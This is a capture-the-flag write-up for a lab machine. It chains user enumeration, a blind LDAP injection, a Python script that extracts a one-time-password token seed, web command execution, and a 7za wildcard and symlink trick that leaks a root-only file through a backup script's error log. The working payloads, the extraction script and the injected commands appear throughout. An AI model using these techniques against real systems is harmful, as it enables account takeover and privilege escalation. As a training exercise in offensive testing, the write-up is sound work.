![image|center|300](../../img/CTF.png)
## Recon
As always we will start with `nmap` to scan for open ports and services. Only `http` on port 80 and `ssh` on port 22
![](../../img/Pasted%20image%2020230511095255.png)

## HTTP Initial Enumeration
![](../../img/Pasted%20image%2020230511095511.png)

It's pretty straightforward that we will get banned for 5 minutues if we tried to bruteforce anything, like sub directories for example. It's also saying that they handle authentication with tokens, there's a login page so let's take a look at it.
![](../../img/Pasted%20image%2020230511095857.png)

We need a username and an `OTP`. An `OTP` is time limited which means that even if we could get a valid one it will give us access only once because it expries in a short time (usually 60 seconds). So we need to gain access to a place that generates valid `OTP` or to be able to generate valid `OTP` ourselves. Let's take a look at the source code of the login page, these comments look interesting:
```html
<!-- we'll change the schema in the next phase of the project (if and only if we will pass the VA/PT) -->
<!-- at the moment we have choosen an already existing attribute in order to store the token string (81 digits) -->
```

So now we know that they are using a token to generate the `OTP`, we also know that the length of the token is 81 digits. But I still couldn't figure out that part about the attribute they are using to store the token. I decided to bruteforce the username then return to the `OTP` thing again. I know what you are thinking, how will I bruteforce the username without getting banned? Well I tried to pass any credentials to see how will the application respond:
![](../../img/Pasted%20image%2020230511100819.png)
![](../../img/Pasted%20image%2020230511100844.png)

Here I noticed 2 things. First thing is that it is actually telling us if the user exists or not, which means that we can enumerate users. The other thing is that it responded normally with a `200 OK` response, so if the server identifies a bruteforce attack by monitoring how many times an ip causes errors like `404` for example, as long as we are not causing errors we won't get banned. I gave it a try to see if it will actually work. I used `wfuzz` and `multiplesources-users-fabian-fingerle.de.txt` from `seclists`. "user not found" responses have 233 words so I filtered them:
![](../../img/Pasted%20image%2020230511101713.png)

It worked and I didnt get banned, after some time I got a result which was `ldapuser`, that's weird. I also noticed that payloads that had special characters in them caused different response length. I tried `ldapuser` to see what is the other message:
![](../../img/Pasted%20image%2020230511102149.png)
![](../../img/Pasted%20image%2020230511102219.png)

I just got the login page back again without any message. I figured out that the username is being used in an `ldap` query, and it's injectable. Also that existing attribute where the token is stored in an `ldap` attribute. With the injection we have we can extract the token and use it to generate valid `OTP`. But beacause the injection is blind it will be kinda tricky to extract the token.

## LDAP Injection
As I said, it is blind injection which means that we won't get any results. But a payload like this: `*)(uid=*))(|(uid=*` should result in "Cannot login". However when I tried it I did not get any message, so i tried to URL encode the payload and it worked. So the injection works when then payload is double URL encode (I only encoded the payload once because the browser automatically encodes POST data). I switched to burp, here are the results
```
inputUsername=%25%32%61%25%32%39%25%32%38%25%37%35%25%36%39%25%36%34%25%33%64%25%32%61%25%32%39%25%32%39%25%32%38%25%37%63%25%32%38%25%37%35%25%36%39%25%36%34%25%33%64%25%32%61&inputOTP=0000
```

Now we need to know which attribute the token is stored in. We know it is an existing attribute so we just need to choose right one. I check `lap attributes` and chose some of them to test (command, page, and info), the payload will be like this: `*)(uid=*))(|(ATTRIBUTE=*` (instead of the second `uid` attribute we will use the attribute we are testing). We also know that the token is numeric so we can remove `*` and replace it with numeric values from 0 to 9 and monitor the responses (I used burp intruder to do this). So the final payload will be like this: `*)(uid=*))(|(ATTRIBUTE=N`. After some testing this payload with the attribute `pager` and value of 2: `*)(uid=*))(|(pager=2` resulted in "Cannot login" message. Great so out payload will be `*)(uid=*))(|(pager=2N` and we will bruteforce the second number again until we get "Cannot login". We will keep repeating this until we reach the 81st number, but doing this manually is lame and boring so I wrote a python script.

## Exploitation, Token Extraction
I created 3 functions:
- `send_payload`: To send the injection payload and receive the response
- `check_response`: To check whether the response contains "Cannot login" or not
- `exploit`: This function creates a list of numbers from 0-9, then by looping through that list it creates the payload which is: `%2A%29%28uid%3D%2A%29%29%28%7C%28pager%3D + token + number + %2A` (encoded only once because python requests automatically encodes POST data). Then it calls `send_payload` and `check_response`, if `check_response` returned `True` it adds the valid number to the token.

Then I wrote a `while` loop to keep calling `exploit()` as long as `len(token)` is not 81
```python
#!/usr/bin/python3
import requests
import sys
from time import sleep

YELLOW = "\033[93m"
GREEN = "\033[32m"

def send_payload(payload):
	sleep(1)
	post_data = {"inputUsername":payload,"inputOTP":"0000"}
	req = requests.post("http://10.129.71.194/login.php",data=post_data)
	response = req.text
	return response

def check_response(response):
	if "Cannot login" in response:
		return True
	else:
		return False

def exploit():
	global token
	n_list = [n for n in range(10)]
	for i in n_list:
		payload = "%2A%29%28uid%3D%2A%29%29%28%7C%28pager%3D{}{}%2A".format(token,str(i))
		response = send_payload(payload)
		if check_response(response):
			token+=str(i)

token = ""
print(YELLOW + "[*] Extracting Token")
while len(token) != 81:
	exploit()
	sys.stdout.write("\r" + YELLOW + "[*] Status : " + token)
	sys.stdout.flush()
else :
	print(GREEN + "\n[!] Done !")
	print(GREEN + "[*] Token : " + token)
```

It took some minutes to finish and now we have the token
![](../../img/Pasted%20image%2020230511113449.png)

I installed `stoken`. then I imported the token:
```bash
stoken import --token 285449490011357156531651545652335570713167411445727140604172141456711102716717000
```

And using stoken-gui
![|center|](../../img/Pasted%20image%2020230511113640.png)

## RCE, User Flag
Let's login and see what's there:
![](../../img/Pasted%20image%2020230511113844.png)

`%2a%29%28uid%3d%2a%29%29%28%7c%28uid%3d%2a` is `*)(uid=*))(|(uid=*` url-encoded.
It redirected me to `/page.php` which I can use to excute commands:
![](../../img/Pasted%20image%2020230511131826.png)

We can see that `ldapuser` is an actual user on the box, I tried to get a reverse shell but for some reason I could not get a reverse shell at all so I started to look in the web files. I was already in the web directory: `/var/www/html`

I listed the files, I started looking for any hardcoded credentials in the `php` file, in `login.php` I found credentials for `ldapuser`:
![](../../img/Pasted%20image%2020230511132542.png)

We owned user.
![](../../img/Pasted%20image%2020230511132826.png)

## 7z List File annd Wildcards, Root Flag
Before enumerating anything I just checked the directories and stuff like that, in / I saw a directory called `backup`. It had a lot of archives, an error log and a script called `honeypot.sh`
![](../../img/Pasted%20image%2020230511133738.png)

`honeypot.sh`
![](../../img/Pasted%20image%2020230511133834.png)

Obviously this script runs from time to time to backup files, also it is running as root. I did not check cronjob or use `pspy`, It was obvious since it is accessing `/root/root.txt` to create the password and only root can access that.
Basically one of the things that this script is doing is that it is backing up all the files in `/var/www/html/uploads` by using `7za` to put all the uploads in one achive. Let's look at the command again:
```bash
7za a /backup/$filename.zip -t7z -snl -p$pass -- *
```
It using the wildcard asterisk ( \* ) to get all file. This means that if we can write to `/var/www/html/uploads` our file will be included in the command. If we can create a malicious file name then we can somehow manipulate the `7za` command.
It is also using this option: `-snl`. I checked the manual page for `7za`: `-snl  Store symbolic links as links`

Note that we can't unzip the created backups, so even if we created a symlink to `root.txt` in `/var/www/html/uploads` we won't be able to read it because the archive is password protected. The only way to actually get anything is through the error log, we need to cause an error that somehow leaks the flag.
After searching for some time I found [Command Line Syntax (osdn.jp)](https://sevenzip.osdn.jp/chm/cmdline/syntax.htm) which talks about a feature in `7z` called list files. I throught if I created 2 files, `root.txt` and `@root.txt`, `root.txt` is a `symlink` to `/root/root.txt`, when the command is executed and gets to `@root.txt` it will treat that as a list file option then it will search for `root.txt` to use it as a list file. However that file is not a real list file (that may cause an error), also it is a `symlink` to  `/root/root.txt`

I went to `/var/www/html/uploads` and I did not even have read access. So I went back to the `RCE` requests in burp and tried as `apache`. I created a `symlink` to `/root/root.txt` as `root.txt`
```
inputCmd=ln -s /root/root.txt uploads/root.txt&inputOTP=91913130
```

Then I created an empty file and called it `@root.txt`
```
inputCmd=touch uploads/@root.txt&inputOTP=91913130
```

Let's check the directory listing now:
![](../../img/Pasted%20image%2020230511140214.png)

Everything is fine, let's check the error log and we owned root!
![](../../img/Pasted%20image%2020230511140007.png)

